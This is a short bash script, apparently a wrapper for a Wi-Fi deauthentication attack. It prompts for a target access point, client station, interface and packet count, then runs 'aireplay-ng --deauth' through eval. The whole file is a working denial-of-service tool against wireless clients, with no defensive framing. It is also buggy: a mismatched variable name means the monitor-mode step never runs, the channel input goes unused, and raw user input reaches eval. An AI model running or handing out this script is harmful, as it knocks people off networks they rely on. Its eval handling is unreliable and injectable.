#!/bin/bash
echo -n "Enable Monitor Mode y/n: "
read enable_monitor
case "$enablemonitor" in
	[yY][eE][sS]|[yY])
			sh ./monitor.sh
			;;
			esac
echo -n "Enter BSSID: "
read bssid
echo -n "Enter Station: "
read station
echo -n "Enter Channel: "
read channel
echo -n "Enter Interface: "
read interface
echo -n "Enter Number of Packets: "
read packets
last_command="aireplay-ng --deauth $packets -a $bssid -c $station $interface"
eval $last_command

